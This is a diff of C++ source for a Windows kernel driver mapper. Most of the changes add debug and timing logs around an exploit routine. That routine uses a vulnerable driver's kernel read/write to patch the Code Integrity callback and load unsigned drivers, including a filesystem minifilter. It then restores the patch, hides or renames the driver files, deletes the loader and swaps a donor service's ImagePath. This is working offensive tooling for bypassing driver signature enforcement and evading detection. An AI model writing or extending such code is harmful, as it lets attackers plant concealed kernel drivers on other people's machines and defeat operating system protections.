@@ -55,7 +55,156 @@ static void DbgLog(const char* func, const char* fmt, ...) {
 
 #define LOG(fmt, ...) DbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
 #define LOG_STATUS(msg, st) DbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")
-// ============ END DEBUG LOGGING ============
+
+static ULONGLONG MapperElapsedMs(ULONGLONG start)
+{
+    ULONGLONG now = GetTickCount64();
+    return now >= start ? now - start : 0;
+}
+
+static ULONG MapperBuildNumber()
+{
+    return *reinterpret_cast<volatile ULONG*>(static_cast<ULONG_PTR>(0x7FFE0260)) & 0xFFFFu;
+}
+
+static void MapperFileNameAnsi(PCWSTR path, char* out, size_t out_count)
+{
+    if (!out || out_count == 0) {
+        return;
+    }
+
+    out[0] = '\0';
+    if (!path || !path[0]) {
+        return;
+    }
+
+    PCWSTR name = wcsrchr(path, L'\\');
+    name = name ? name + 1 : path;
+    WideCharToMultiByte(CP_ACP, 0, name, -1, out, static_cast<int>(out_count), nullptr, nullptr);
+    out[out_count - 1] = '\0';
+}
+
+static void LogKernelModuleSnapshot(const char* phase, PCWSTR target, PCWSTR sentinel, PCWSTR shadowfs)
+{
+    const ULONGLONG start = GetTickCount64();
+    const char* phase_name = phase ? phase : "unknown";
+    if (!NtQuerySystemInformationPtr) {
+        LOG("module_snapshot phase=%s skipped reason=NtQuerySystemInformation_unresolved pid=%lu tid=%lu build=%lu",
+            phase_name,
+            GetCurrentProcessId(),
+            GetCurrentThreadId(),
+            MapperBuildNumber());
+        return;
+    }
+
+    ULONG returnLength = 0;
+    NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
+    ULONG bufferSize = returnLength + 4096;
+    if (bufferSize < 65536) {
+        bufferSize = 65536;
+    }
+
+    PVOID buffer = nullptr;
+    for (ULONG attempt = 0; attempt < 3; ++attempt) {
+        if (buffer) {
+            VirtualFree(buffer, 0, MEM_RELEASE);
+            buffer = nullptr;
+        }
+        buffer = VirtualAlloc(nullptr, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!buffer) {
+            LOG("module_snapshot phase=%s alloc_failed size=%lu gle=%lu elapsed_ms=%llu",
+                phase_name,
+                bufferSize,
+                GetLastError(),
+                MapperElapsedMs(start));
+            return;
+        }
+        status = NtQuerySystemInformationPtr(11, buffer, bufferSize, &returnLength);
+        if (status != STATUS_INFO_LENGTH_MISMATCH) {
+            break;
+        }
+        bufferSize = returnLength + 4096;
+    }
+
+    if (!NT_SUCCESS(status)) {
+        LOG("module_snapshot phase=%s query_failed status=0x%08X returnLength=%lu bufferSize=%lu elapsed_ms=%llu",
+            phase_name,
+            (DWORD)status,
+            returnLength,
+            bufferSize,
+            MapperElapsedMs(start));
+        if (buffer) {
+            VirtualFree(buffer, 0, MEM_RELEASE);
+        }
+        return;
+    }
+
+    char targetName[260] = {};
+    char sentinelName[260] = {};
+    char shadowName[260] = {};
+    MapperFileNameAnsi(target, targetName, sizeof(targetName));
+    MapperFileNameAnsi(sentinel, sentinelName, sizeof(sentinelName));
+    MapperFileNameAnsi(shadowfs, shadowName, sizeof(shadowName));
+
+    PRTL_PROCESS_MODULES modules = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
+    PVOID targetBase = nullptr;
+    PVOID sentinelBase = nullptr;
+    PVOID shadowBase = nullptr;
+    ULONG targetSize = 0;
+    ULONG sentinelSize = 0;
+    ULONG shadowSize = 0;
+
+    for (ULONG i = 0; i < modules->NumberOfModules; ++i) {
+        auto& mod = modules->Modules[i];
+        const char* fileName = reinterpret_cast<const char*>(mod.FullPathName + mod.OffsetToFileName);
+        if (i < 8) {
+            LOG("module_snapshot phase=%s module[%lu]='%s' base=%p size=0x%X flags=0x%X load=%u init=%u",
+                phase_name,
+                i,
+                fileName,
+                mod.ImageBase,
+                mod.ImageSize,
+                mod.Flags,
+                mod.LoadOrderIndex,
+                mod.InitOrderIndex);
+        }
+        if (targetName[0] && _stricmp(fileName, targetName) == 0) {
+            targetBase = mod.ImageBase;
+            targetSize = mod.ImageSize;
+        }
+        if (sentinelName[0] && _stricmp(fileName, sentinelName) == 0) {
+            sentinelBase = mod.ImageBase;
+            sentinelSize = mod.ImageSize;
+        }
+        if (shadowName[0] && _stricmp(fileName, shadowName) == 0) {
+            shadowBase = mod.ImageBase;
+            shadowSize = mod.ImageSize;
+        }
+    }
+
+    LOG("module_snapshot phase=%s status=0x%08X modules=%lu pid=%lu tid=%lu build=%lu target='%s' target_base=%p target_size=0x%X sentinel='%s' sentinel_base=%p sentinel_size=0x%X shadow='%s' shadow_base=%p shadow_size=0x%X ci_patched=%u ci_addr=%p original_ci=%p elapsed_ms=%llu",
+        phase_name,
+        (DWORD)status,
+        modules->NumberOfModules,
+        GetCurrentProcessId(),
+        GetCurrentThreadId(),
+        MapperBuildNumber(),
+        targetName[0] ? targetName : "(none)",
+        targetBase,
+        targetSize,
+        sentinelName[0] ? sentinelName : "(none)",
+        sentinelBase,
+        sentinelSize,
+        shadowName[0] ? shadowName : "(none)",
+        shadowBase,
+        shadowSize,
+        g_CiCallbackPatched ? 1u : 0u,
+        g_CiCallbackAddress,
+        g_OriginalCiCallback,
+        MapperElapsedMs(start));
+
+    VirtualFree(buffer, 0, MEM_RELEASE);
+}
 
 static void OpenMapperLog()
 {
@@ -446,17 +595,46 @@ namespace MapperCore {
                             PCWSTR sentinelDriverFullPath, PCWSTR shadowFsDriverFullPath,
                             PCWSTR loaderDriverFullPath) {
         LOG("=== TriggerExploit START ===");
+        const ULONGLONG exploitStartTick = GetTickCount64();
+        LOG("TriggerExploit context pid=%lu tid=%lu tick=%llu loader_service=%ls target_service=%ls sentinel_service=%ls shadowfs_service=%ls",
+            GetCurrentProcessId(),
+            GetCurrentThreadId(),
+            static_cast<unsigned long long>(exploitStartTick),
+            g_LoaderServicePath,
+            g_DriverServicePath,
+            g_SentinelServicePath,
+            g_ShadowFsServicePath);
+        LOG("TriggerExploit paths build=%lu loader_full=%ls target_full=%ls sentinel_full=%ls shadowfs_full=%ls",
+            MapperBuildNumber(),
+            loaderDriverFullPath ? loaderDriverFullPath : L"(null)",
+            targetDriverFullPath ? targetDriverFullPath : L"(null)",
+            sentinelDriverFullPath ? sentinelDriverFullPath : L"(null)",
+            shadowFsDriverFullPath ? shadowFsDriverFullPath : L"(null)");
         LOG("Target driver: %ls", targetDriverFileName ? targetDriverFileName : L"(null)");
         LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");
+        LogKernelModuleSnapshot("trigger_entry", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
 
         HANDLE deviceHandle = nullptr;
+        const ULONGLONG openStartTick = GetTickCount64();
         NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);
         LOG_STATUS("OpenDevice (initial attempt)", status);
+        LOG("OpenDevice initial detail status=0x%08X handle=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+            (DWORD)status,
+            deviceHandle,
+            MapperElapsedMs(openStartTick),
+            MapperElapsedMs(exploitStartTick));
 
         if (!NT_SUCCESS(status)) {
             LOG("Device not open, loading vuln driver via service...");
+            const ULONGLONG loaderLoadStartTick = GetTickCount64();
             status = DriverLoader::LoadDriver(g_LoaderServicePath);
             LOG_STATUS("LoadDriver (vuln/loader)", status);
+            LOG("LoadDriver loader detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+                (DWORD)status,
+                g_LoaderServicePath,
+                MapperElapsedMs(loaderLoadStartTick),
+                MapperElapsedMs(exploitStartTick));
+            LogKernelModuleSnapshot("after_loader_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
 
             if (!NT_SUCCESS(status) &&
                 status != STATUS_OBJECT_NAME_COLLISION &&
@@ -467,7 +645,14 @@ namespace MapperCore {
             LOG("Waiting for device to appear (retrying up to 10 times)...");
             for (int retry = 0; retry < 10; retry++) {
                 Sleep(100);
+                const ULONGLONG retryStartTick = GetTickCount64();
                 status = VulnDriver::OpenDevice(&deviceHandle);
+                LOG("OpenDevice retry=%d status=0x%08X handle=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+                    retry,
+                    (DWORD)status,
+                    deviceHandle,
+                    MapperElapsedMs(retryStartTick),
+                    MapperElapsedMs(exploitStartTick));
                 if (NT_SUCCESS(status)) {
                     LOG("Device opened on retry %d, handle=%p", retry, deviceHandle);
                     break;
@@ -494,45 +679,137 @@ namespace MapperCore {
 
                 PVOID originalCallback = nullptr;
                 LOG("Reading original CI callback from kernel addr %p...", ciValidateImageHeaderEntry);
+                const ULONGLONG readCiStartTick = GetTickCount64();
                 status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                 LOG_STATUS("ReadKernelMemory (original CI callback)", status);
                 LOG("Original CI callback value: %p", originalCallback);
+                LOG("CI original read detail status=0x%08X addr=%p value=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+                    (DWORD)status,
+                    ciValidateImageHeaderEntry,
+                    originalCallback,
+                    MapperElapsedMs(readCiStartTick),
+                    MapperElapsedMs(exploitStartTick));
 
                 if (NT_SUCCESS(status)) {
                     g_OriginalCiCallback = originalCallback;
                     g_CiCallbackAddress = ciValidateImageHeaderEntry;
 
                     LOG("Patching CI callback -> ZwFlushInstructionCache (%p)...", zwFlushInstructionCache);
+                    const ULONGLONG patchStartTick = GetTickCount64();
                     status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
                     LOG_STATUS("WriteKernelMemory (CI patch)", status);
+                    LOG("CI patch write detail status=0x%08X addr=%p replacement=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+                        (DWORD)status,
+                        ciValidateImageHeaderEntry,
+                        zwFlushInstructionCache,
+                        MapperElapsedMs(patchStartTick),
+                        MapperElapsedMs(exploitStartTick));
 
                     if (NT_SUCCESS(status)) {
                         g_CiCallbackPatched = true;
+                        PVOID patchedCallback = nullptr;
+                        const ULONGLONG patchVerifyStartTick = GetTickCount64();
+                        NTSTATUS patchVerifyStatus = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &patchedCallback, sizeof(PVOID));
+                        LOG_STATUS("ReadKernelMemory (CI patch verify)", patchVerifyStatus);
+                        LOG("CI patch verify detail status=0x%08X addr=%p value=%p expected=%p match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                            (DWORD)patchVerifyStatus,
+                            ciValidateImageHeaderEntry,
+                            patchedCallback,
+                            zwFlushInstructionCache,
+                            patchedCallback == zwFlushInstructionCache ? 1u : 0u,
+                            MapperElapsedMs(patchVerifyStartTick),
+                            MapperElapsedMs(exploitStartTick));
                         LOG("CI callback patched successfully, now loading target driver...");
                         LOG("Target driver service path: %ls", g_DriverServicePath);
+                        const ULONGLONG targetLoadStartTick = GetTickCount64();
                         status = DriverLoader::LoadDriver(g_DriverServicePath);
                         LOG_STATUS("LoadDriver (WhosWho/target)", status);
+                        LOG("LoadDriver target detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+                            (DWORD)status,
+                            g_DriverServicePath,
+                            MapperElapsedMs(targetLoadStartTick),
+                            MapperElapsedMs(exploitStartTick));
+                        LogKernelModuleSnapshot("after_target_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                        {
+                            ULONG targetImageSizeAfterLoad = 0;
+                            PVOID targetBaseAfterLoad = targetDriverFileName
+                                ? KernelUtils::GetDriverBaseByName(targetDriverFileName, &targetImageSizeAfterLoad)
+                                : nullptr;
+                            LOG("Post-load module query (WhosWho): status=0x%08X base=%p size=0x%X elapsed_ms=%llu",
+                                static_cast<DWORD>(status),
+                                targetBaseAfterLoad,
+                                targetImageSizeAfterLoad,
+                                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                        }
                         if (NT_SUCCESS(status) && targetDriverFullPath && targetDriverFullPath[0]) {
                             LOG("Hiding target driver file immediately after load: %ls", targetDriverFullPath);
+                            const ULONGLONG hideTargetStartTick = GetTickCount64();
                             if (Utils::HideLoadedImagePath(targetDriverFullPath)) {
-                                LOG("Target driver file hidden/renamed after load");
+                                LOG("Target driver file hidden/renamed after load elapsed_ms=%llu total_elapsed_ms=%llu",
+                                    MapperElapsedMs(hideTargetStartTick),
+                                    MapperElapsedMs(exploitStartTick));
                             } else {
-                                LOG("WARNING: Target driver file hide deferred after load, GLE=%u", GetLastError());
+                                LOG("WARNING: Target driver file hide deferred after load, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                                    GetLastError(),
+                                    MapperElapsedMs(hideTargetStartTick),
+                                    MapperElapsedMs(exploitStartTick));
                             }
+                            ULONG targetImageSizeAfterHide = 0;
+                            PVOID targetBaseAfterHide = targetDriverFileName
+                                ? KernelUtils::GetDriverBaseByName(targetDriverFileName, &targetImageSizeAfterHide)
+                                : nullptr;
+                            LOG("Post-hide module query (WhosWho): base=%p size=0x%X gle=%lu elapsed_ms=%llu",
+                                targetBaseAfterHide,
+                                targetImageSizeAfterHide,
+                                GetLastError(),
+                                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                         }
 
                         NTSTATUS sentStatus = STATUS_SUCCESS;
                         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                             LOG("Loading sentinel driver, service path: %ls", g_SentinelServicePath);
+                            const ULONGLONG sentinelLoadStartTick = GetTickCount64();
                             sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                             LOG_STATUS("LoadDriver (Sentinel)", sentStatus);
+                            LOG("LoadDriver sentinel detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+                                (DWORD)sentStatus,
+                                g_SentinelServicePath,
+                                MapperElapsedMs(sentinelLoadStartTick),
+                                MapperElapsedMs(exploitStartTick));
+                            LogKernelModuleSnapshot("after_sentinel_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
+                            {
+                                ULONG sentinelImageSizeAfterLoad = 0;
+                                PVOID sentinelBaseAfterLoad = sentinelDriverFileName
+                                    ? KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentinelImageSizeAfterLoad)
+                                    : nullptr;
+                                LOG("Post-load module query (Sentinel): status=0x%08X base=%p size=0x%X elapsed_ms=%llu",
+                                    static_cast<DWORD>(sentStatus),
+                                    sentinelBaseAfterLoad,
+                                    sentinelImageSizeAfterLoad,
+                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+                            }
                             if (NT_SUCCESS(sentStatus) && sentinelDriverFullPath && sentinelDriverFullPath[0]) {
                                 LOG("Hiding sentinel driver file immediately after load: %ls", sentinelDriverFullPath);
+                                const ULONGLONG hideSentinelStartTick = GetTickCount64();
                                 if (Utils::HideLoadedImagePath(sentinelDriverFullPath)) {
-                                    LOG("Sentinel driver file hidden/renamed after load");
+                                    LOG("Sentinel driver file hidden/renamed after load elapsed_ms=%llu total_elapsed_ms=%llu",
+                                        MapperElapsedMs(hideSentinelStartTick),
+                                        MapperElapsedMs(exploitStartTick));
                                 } else {
-                                    LOG("WARNING: Sentinel driver file hide deferred after load, GLE=%u", GetLastError());
+                                    LOG("WARNING: Sentinel driver file hide deferred after load, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                                        GetLastError(),
+                                        MapperElapsedMs(hideSentinelStartTick),
+                                        MapperElapsedMs(exploitStartTick));
                                 }
+                                ULONG sentinelImageSizeAfterHide = 0;
+                                PVOID sentinelBaseAfterHide = sentinelDriverFileName
+                                    ? KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentinelImageSizeAfterHide)
+                                    : nullptr;
+                                LOG("Post-hide module query (Sentinel): base=%p size=0x%X gle=%lu elapsed_ms=%llu",
+                                    sentinelBaseAfterHide,
+                                    sentinelImageSizeAfterHide,
+                                    GetLastError(),
+                                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                             }
                             if (!NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
                                 LOG("FATAL: Sentinel load is required and failed with status 0x%08X", (DWORD)sentStatus);
@@ -544,14 +821,27 @@ namespace MapperCore {
                         NTSTATUS shadowFsStatus = STATUS_UNSUCCESSFUL;
                         if (NT_SUCCESS(status) && shadowFsDriverFileName && g_ShadowFsServicePath[0]) {
                             LOG("Loading shadowfs driver, service path: %ls", g_ShadowFsServicePath);
+                            const ULONGLONG shadowLoadStartTick = GetTickCount64();
                             shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath);
                             LOG_STATUS("LoadDriver (ShadowFS)", shadowFsStatus);
+                            LOG("LoadDriver shadowfs detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+                                (DWORD)shadowFsStatus,
+                                g_ShadowFsServicePath,
+                                MapperElapsedMs(shadowLoadStartTick),
+                                MapperElapsedMs(exploitStartTick));
+                            LogKernelModuleSnapshot("after_shadowfs_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
                             if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFullPath && shadowFsDriverFullPath[0]) {
                                 LOG("Hiding shadowfs driver file immediately after load: %ls", shadowFsDriverFullPath);
+                                const ULONGLONG hideShadowStartTick = GetTickCount64();
                                 if (Utils::HideLoadedImagePath(shadowFsDriverFullPath)) {
-                                    LOG("ShadowFS driver file hidden/renamed after load");
+                                    LOG("ShadowFS driver file hidden/renamed after load elapsed_ms=%llu total_elapsed_ms=%llu",
+                                        MapperElapsedMs(hideShadowStartTick),
+                                        MapperElapsedMs(exploitStartTick));
                                 } else {
-                                    LOG("WARNING: ShadowFS driver file hide deferred after load, GLE=%u", GetLastError());
+                                    LOG("WARNING: ShadowFS driver file hide deferred after load, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                                        GetLastError(),
+                                        MapperElapsedMs(hideShadowStartTick),
+                                        MapperElapsedMs(exploitStartTick));
                                 }
                             }
                         } else if (!NT_SUCCESS(status)) {
@@ -559,9 +849,23 @@ namespace MapperCore {
                         }
 
                         LOG("Restoring original CI callback %p...", originalCallback);
+                        const ULONGLONG restoreStartTick = GetTickCount64();
                         NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                         LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
                         g_CiCallbackPatched = false;
+                        PVOID restoredCallback = nullptr;
+                        NTSTATUS restoreVerifyStatus = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &restoredCallback, sizeof(PVOID));
+                        LOG_STATUS("ReadKernelMemory (CI restore verify)", restoreVerifyStatus);
+                        LOG("CI restore detail write_status=0x%08X verify_status=0x%08X addr=%p value=%p expected=%p match=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                            (DWORD)restoreStatus,
+                            (DWORD)restoreVerifyStatus,
+                            ciValidateImageHeaderEntry,
+                            restoredCallback,
+                            originalCallback,
+                            restoredCallback == originalCallback ? 1u : 0u,
+                            MapperElapsedMs(restoreStartTick),
+                            MapperElapsedMs(exploitStartTick));
+                        LogKernelModuleSnapshot("after_ci_restore", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
 
                         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0] &&
                             !NT_SUCCESS(sentStatus) && sentStatus != STATUS_IMAGE_ALREADY_LOADED) {
@@ -599,16 +903,27 @@ namespace MapperCore {
 
 
         if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
-            LOG("--- WriteSentinelGlobals phase ---");
+            LOG("--- WriteSentinelGlobals phase begin elapsed_ms=%llu status=0x%08X ---",
+                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick),
+                static_cast<DWORD>(status));
             ULONG sentImageSize = 0;
+            LOG("Sentinel base discovery attempt=0 name=%ls elapsed_ms=%llu",
+                sentinelDriverFileName,
+                MapperElapsedMs(exploitStartTick));
+            LogKernelModuleSnapshot("before_sentinel_global_discovery", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
             PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
-            LOG("Sentinel driver base: %p, size: 0x%X", sentBase, sentImageSize);
+            LOG("Sentinel driver base: %p, size: 0x%X elapsed_ms=%llu", sentBase, sentImageSize,
+                static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
             if (sentBase) {
                 g_SentinelLoadAddress = sentBase;
                 g_SentinelImageSize = sentImageSize;
                 ULONG whoswhoImageSize = 0;
+                LOG("WhosWho base discovery attempt=0 name=%ls elapsed_ms=%llu",
+                    targetDriverFileName,
+                    MapperElapsedMs(exploitStartTick));
                 PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
-                LOG("WhosWho driver base: %p, size: 0x%X", whoswhoBase, whoswhoImageSize);
+                LOG("WhosWho driver base: %p, size: 0x%X elapsed_ms=%llu", whoswhoBase, whoswhoImageSize,
+                    static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
                 if (whoswhoBase) {
                     g_DriverLoadAddress = whoswhoBase;
                     BOOL wsgResult = WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
@@ -626,25 +941,57 @@ namespace MapperCore {
         }
 
 
-        LOG("Closing vuln device and unloading loader driver...");
+        LOG("Closing vuln device and unloading loader driver elapsed_ms=%llu...",
+            static_cast<unsigned long long>(GetTickCount64() - exploitStartTick));
+        const ULONGLONG closeStartTick = GetTickCount64();
         VulnDriver::CloseDevice(deviceHandle);
+        LOG("CloseDevice completed handle=%p elapsed_ms=%llu total_elapsed_ms=%llu",
+            deviceHandle,
+            MapperElapsedMs(closeStartTick),
+            MapperElapsedMs(exploitStartTick));
+        const ULONGLONG unloadStartTick = GetTickCount64();
         NTSTATUS unloadStatus = DriverLoader::UnloadDriver(g_LoaderServicePath);
+        LOG_STATUS("UnloadDriver (loader)", unloadStatus);
+        LOG("UnloadDriver loader detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+            (DWORD)unloadStatus,
+            g_LoaderServicePath,
+            MapperElapsedMs(unloadStartTick),
+            MapperElapsedMs(exploitStartTick));
+        LogKernelModuleSnapshot("after_loader_unload", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);
         if (NT_SUCCESS(unloadStatus) && loaderDriverFullPath && loaderDriverFullPath[0]) {
             LOG("Deleting loader driver file immediately after unload: %ls", loaderDriverFullPath);
+            const ULONGLONG loaderDeleteStartTick = GetTickCount64();
             if (Utils::ForceDeleteOrRename(loaderDriverFullPath)) {
-                LOG("Loader driver file deleted/renamed immediately after unload");
+                LOG("Loader driver file deleted/renamed immediately after unload elapsed_ms=%llu total_elapsed_ms=%llu",
+                    MapperElapsedMs(loaderDeleteStartTick),
+                    MapperElapsedMs(exploitStartTick));
             } else {
-                LOG("WARNING: Loader driver file deletion deferred after unload, GLE=%u", GetLastError());
+                LOG("WARNING: Loader driver file deletion deferred after unload, GLE=%u elapsed_ms=%llu total_elapsed_ms=%llu",
+                    GetLastError(),
+                    MapperElapsedMs(loaderDeleteStartTick),
+                    MapperElapsedMs(exploitStartTick));
             }
         }
 
-        LOG("=== TriggerExploit END, status=0x%08X ===", (DWORD)status);
+        LOG("=== TriggerExploit END, status=0x%08X elapsed_ms=%llu ci_patched=%u sentinel_base=%p sentinel_size=0x%X target_base=%p ===",
+            (DWORD)status,
+            static_cast<unsigned long long>(GetTickCount64() - exploitStartTick),
+            g_CiCallbackPatched ? 1u : 0u,
+            g_SentinelLoadAddress,
+            g_SentinelImageSize,
+            g_DriverLoadAddress);
         return status;
     }
 
     NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath,
                             PCWSTR shadowFsPath) {
         LOG("=== WindLoadDriver START ===");
+        const ULONGLONG windStartTick = GetTickCount64();
+        LOG("WindLoadDriver context pid=%lu tid=%lu build=%lu tick=%llu",
+            GetCurrentProcessId(),
+            GetCurrentThreadId(),
+            MapperBuildNumber(),
+            static_cast<unsigned long long>(windStartTick));
         LOG("loaderPath: %ls", loaderPath ? loaderPath : L"(null)");
         LOG("driverPath: %ls", driverPath ? driverPath : L"(null)");
         LOG("sentinelPath: %ls", sentinelPath ? sentinelPath : L"(null)");
@@ -652,6 +999,9 @@ namespace MapperCore {
 
         NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
         LOG_STATUS("AdjustPrivilege (SeLoadDriverPrivilege)", status);
+        LOG("AdjustPrivilege detail status=0x%08X elapsed_ms=%llu",
+            (DWORD)status,
+            MapperElapsedMs(windStartTick));
         if (!NT_SUCCESS(status)) {
             LOG("FATAL: Cannot acquire SeLoadDriverPrivilege!");
             return status;
@@ -675,14 +1025,14 @@ namespace MapperCore {
 
         status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
         LOG_STATUS("CreateDriverService (target driver)", status);
-        LOG("Driver service path: %ls", g_DriverServicePath);
+        LOG("Driver service path: %ls elapsed_ms=%llu", g_DriverServicePath, MapperElapsedMs(windStartTick));
         if (!NT_SUCCESS(status)) {
             return status;
         }
 
         status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
         LOG_STATUS("CreateDriverService (loader)", status);
-        LOG("Loader service path: %ls", g_LoaderServicePath);
+        LOG("Loader service path: %ls elapsed_ms=%llu", g_LoaderServicePath, MapperElapsedMs(windStartTick));
         if (!NT_SUCCESS(status)) {
             return status;
         }
@@ -698,7 +1048,7 @@ namespace MapperCore {
             LOG("Sentinel full path: %ls", sentinelFullPath);
             status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
             LOG_STATUS("CreateDriverService (sentinel)", status);
-            LOG("Sentinel service path: %ls", g_SentinelServicePath);
+            LOG("Sentinel service path: %ls elapsed_ms=%llu", g_SentinelServicePath, MapperElapsedMs(windStartTick));
             if (!NT_SUCCESS(status)) {
                 return status;
             }
@@ -718,7 +1068,7 @@ namespace MapperCore {
                 L"AiDAShadowFS Instance",
                 L"385701");
             LOG_STATUS("CreateMinifilterService (shadowfs)", status);
-            LOG("ShadowFS service path: %ls", g_ShadowFsServicePath);
+            LOG("ShadowFS service path: %ls elapsed_ms=%llu", g_ShadowFsServicePath, MapperElapsedMs(windStartTick));
             if (!NT_SUCCESS(status)) {
                 return status;
             }
@@ -847,23 +1197,56 @@ namespace MapperCore {
                                 driverFullPath, sentinelFullPath, shadowFsFullPath,
                                 loaderFullPath);
         LOG_STATUS("TriggerExploit", status);
+        LOG("TriggerExploit returned status=0x%08X elapsed_ms=%llu target_file=%ls sentinel_file=%ls shadowfs_file=%ls",
+            static_cast<DWORD>(status),
+            static_cast<unsigned long long>(GetTickCount64() - windStartTick),
+            targetFileName ? targetFileName : L"(null)",
+            sentinelFileName ? sentinelFileName : L"(null)",
+            shadowFsFileName ? shadowFsFileName : L"(null)");
+        LogKernelModuleSnapshot("wind_after_trigger", targetFileName, sentinelFileName, shadowFsFileName);
         if (NT_SUCCESS(status)) {
             LOG("Hiding loaded driver file: %ls", driverFullPath);
+            const ULONGLONG finalTargetHideStart = GetTickCount64();
             if (Utils::HideLoadedImagePath(driverFullPath)) {
-                LOG("Driver file hidden/renamed OK");
+                LOG("Driver file hidden/renamed OK elapsed_ms=%llu total_elapsed_ms=%llu",
+                    MapperElapsedMs(finalTargetHideStart),
+                    MapperElapsedMs(windStartTick));
             } else {
-                LOG("WARNING: Failed to hide loaded driver file");
+                LOG("WARNING: Failed to hide loaded driver file gle=%lu elapsed_ms=%llu total_elapsed_ms=%llu",
+                    GetLastError(),
+                    MapperElapsedMs(finalTargetHideStart),
+                    MapperElapsedMs(windStartTick));
             }
 
             if (sentinelFullPath[0]) {
+                const ULONGLONG finalSentinelHideStart = GetTickCount64();
                 if (Utils::HideLoadedImagePath(sentinelFullPath)) {
+                    LOG("Sentinel final hide OK path=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+                        sentinelFullPath,
+                        MapperElapsedMs(finalSentinelHideStart),
+                        MapperElapsedMs(windStartTick));
                 } else {
+                    LOG("Sentinel final hide failed path=%ls gle=%lu elapsed_ms=%llu total_elapsed_ms=%llu",
+                        sentinelFullPath,
+                        GetLastError(),
+                        MapperElapsedMs(finalSentinelHideStart),
+                        MapperElapsedMs(windStartTick));
                 }
             }
 
             if (shadowFsFullPath[0]) {
+                const ULONGLONG finalShadowHideStart = GetTickCount64();
                 if (Utils::HideLoadedImagePath(shadowFsFullPath)) {
+                    LOG("ShadowFS final hide OK path=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
+                        shadowFsFullPath,
+                        MapperElapsedMs(finalShadowHideStart),
+                        MapperElapsedMs(windStartTick));
                 } else {
+                    LOG("ShadowFS final hide failed path=%ls gle=%lu elapsed_ms=%llu total_elapsed_ms=%llu",
+                        shadowFsFullPath,
+                        GetLastError(),
+                        MapperElapsedMs(finalShadowHideStart),
+                        MapperElapsedMs(windStartTick));
                 }
             }
         }
@@ -881,10 +1264,25 @@ namespace MapperCore {
                 ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));
 
             if (NT_SUCCESS(regStatus)) {
+                LOG("Donor ImagePath replacement OK donor=%ls service=%ls elapsed_ms=%llu",
+                    ntDonorPath,
+                    g_DriverServicePath,
+                    MapperElapsedMs(windStartTick));
             } else {
